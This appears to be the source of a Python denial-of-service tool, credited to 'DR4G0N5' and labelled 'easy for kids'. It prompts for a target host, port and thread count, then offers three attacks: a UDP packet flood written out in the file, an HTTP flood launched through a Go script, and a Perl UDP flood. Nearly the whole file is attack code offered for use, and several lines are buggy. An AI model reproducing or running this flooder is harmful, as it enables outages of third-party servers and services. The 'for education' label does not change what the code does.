
"""

    CODED BY DR4G0N5
    SMALL TOOLS/EASY FOR KIDS DDOS
    INDONESIAN, JATIM.
    THIS TOOLS FOR EDUCATION

"""

import os
import sys
import socket, socks
import threading
import time
import random
import urllib3
import subprocess
from random import randint
from etc.set import clear
from sys import stdout
from etc.set import *
from etc.banner import banner_drgn
#from tools.test import test_open

urllib3.disable_warnings()
urllib3.PoolManager()

ip1 = randint(0, 250)
ip2 = randint(0, 250)
ip3 = randint(0, 250)
ip4 = randint(0, 250)

threads      = int(0)
ip_target    = str(0)
port_target  = int(0)
total_attack = int(0)
choice       = int(0)
multi        = int(250)
random_ip    = str(ip1)+'.'+str(ip1)+'.'+str(ip1)+'.'+str(ip1)

ERROR_MSG   = '\u001b[1m[u001b[1m[\u001b[31mERROR\u001b[0m\u001b[1m]\u001b[0m'
WARNING_MSG = '[WARN]'
SUCCESS_MSG = '[\u001b[32;1mSUCCESS\u001b[0m]'

NFound='\n\u001b[1m[\u001b[31mNot Found Choice!\u001b[0m\u001b[1m]\u001b[0m'
Aborted='\n\u001b[1m[\u001b[31mABORTED!\u001b[0m\u001b[1m]\u001b[0m'
IP_NOTFOUND='\n\u001b[1m[\u001b[31mNOT FOUND IP!\u001b[0m\u001b[1m]\u001b[0m'

def mode():
    print(f'''
   \u001b[1m[\u001b[32;1m1\u001b[0m\u001b[1m]\u001b[0m UDP FLOOD ........... {SUCES_SYM}
   \u001b[1m[\u001b[32;1m2\u001b[0m\u001b[1m]\u001b[0m HTTP FLOOD .......... {SUCES_SYM}
   \u001b[1m[\u001b[32;1m3\u001b[0m\u001b[1m]\u001b[0m UDP FLOOD(perl) ..... {SUCES_SYM}\n''')
    while True:
        choice = input(promt_choice)
        if choice == '1':
            clear()
            print(f'{PULS} Attacking {ip_target}')
            udp_flood(ip_target, port_target)
        elif choice == '2':
            http_flood(ip_target, threads)
        elif choice == '3':
            udp_flood_perl(ip_target, port_target, threads)
class start_min:
    def __init__(self):

        clear()
        banner_drgn()
        self.main_launc()

    def main_launc(self):

            clear()
            banner_drgn()
            try:
                self.target()
                self.port()
                self.thread()
                mode()
                self.start()
            except KeyboardInterrupt:
                sys.exit(Aborted)

    def target(self):

        global ip_target
        try:

            ip_targets = input(f'{PULS} IP Target : ')
            if len(ip_targets) <= 5 or ip_targets == '':
                sys.exit(f'{IP_NOTFOUND}')
            elif '.' not in ip_targets:
                sys.exit(IP_NOTFOUND)
            else:
                ip_target = ip_targets
                time.sleep(0.2)
            ip_target = ip_targets
            try:
                try:
                    if ip_targets[0]+ip_targets[1]+ip_targets[2]+ip_targets[3] == "www.":
                        ip_targets = "http://" + ip_targets
                    elif ip_targets[0]+ip_targets[1]+ip_targets[2]+ip_targets[3] == "http":
                        pass
                    else:
                        ip_targets = "http://" + ip_targets
                except:
                    self.target()
                try:
                    self.host = ip_targets.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
                except:
                    self.host = ip_targets.replace("http://", "").replace("https://", "").split("/")[0]
                ip_host = socket.gethostbyname(self.host)


            except:
                self.target()


        except KeyboardInterrupt:
            sys.exit(Aborted)


    def port(self):

        global port_target
        global port_targets
        try:

            port_targets = str(input(f'{PULS} Port Target: '))
            if port_targets == '':
                if 'https' in ip_target:
                    port_target = int(443)
                else:
                    port_target = int(80)
            elif len(port_targets) == '1':
                port_target = int(80)
            else:
                port_target = port_targets
                time.sleep(0.2)

        except ValueError:
            port_target = int(80)

    def thread(self):

        global threads
        try:
            thread_c = int(input(f'{PULS} Thread[2000]: '))
            if thread_c == '':
                threads = 2000
            else:
                threads += thread_c
        except ValueError:
            threads = 2000

    def start(self):

        clear()
        ready = input(f'\n\n  {PULS} ENTER TO LAUNCH.')

def udp_flood(target, port):
    bytes  = random._urandom(50000)
    t_g    = (str(target), int(port))
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            total_attack += 1
            s.sendto(bytes,t_g)
            s.sendto(('GET /'+target+'HTTP/1.1\r\n'+'Host: '+random_ip+'\r\n\r\n').encode('ascii'), (target, port))
            sys.stdout.write(f'{PULS} Flooding: '+str(ip_target)+' | Paket Dikirim ['+total_attack+']\r')
            sys.stdout.flush()
            try:
                for i in range(str(multi)):
                    s.sendto(bytes,t_g)
                    total_attack += 1
                    s.sendto(('GET /'+target+'HTTP/1.1\r\n'+'Host: '+random_ip+'\r\n\r\n').encode('ascii'), (target, port))
                    sys.stdout.write(f'{PULS} Flooding: '+str(ip_target)+' | Paket Dikirim ['+total_attack+']\r')
                    sys.stdout.flush()
            except:
                try:
                    s.close()
                except:
                    pass
        except:
            try:
                s.close()
            except:
               pass

def http_flood(target, threads):
    try:
        sec=input(f'{PULS} Second: ')
        print('[1] Get\n[2] Post')
        met=input(promt_choice)
        if met == '1':
            met = 'get'
        elif met == '2':
            met = 'post'
        elif sec == '':
            sec = 60
        os.system(f'go run tools/net/DDOS/http_flood.go {target} {threads} {met} {sec} tools/net/DDOS/header.txt')
    except KeyboardInterrupt:
        sys.exit(Aborted)
    except ValueError:
        sys.exit(NFound)

def udp_flood_perl(target, port, threads):

    try:
        band=input(f'{PULS} Bandwidth: ')
        time=input(f'{PULS} Seconds: ')
        delay=input(f'{PULS} Delay: ')
        if band == '':
            band=60
        elif time == '':
            time==120
        elif delay=='':
            delay=5
        clear()
        os.system(f'perl tools/net/udpflood.pl {target} --port {port} --size {threads} --bandwidth {band} --time {time} --delay {delay}')
        sys.exit()
    except KeyboardInterrupt:
        sys.exit(Aborted)
    except ValueError:
        sys.exit(NFound)

def tools_list():

    clear()
    banner_drgn()
    try:
        start_min()
    except ValueError:
        sys.exit(NFound)

if __name__ == '__main__':
    try:

        tools_list()

    except:
        pass
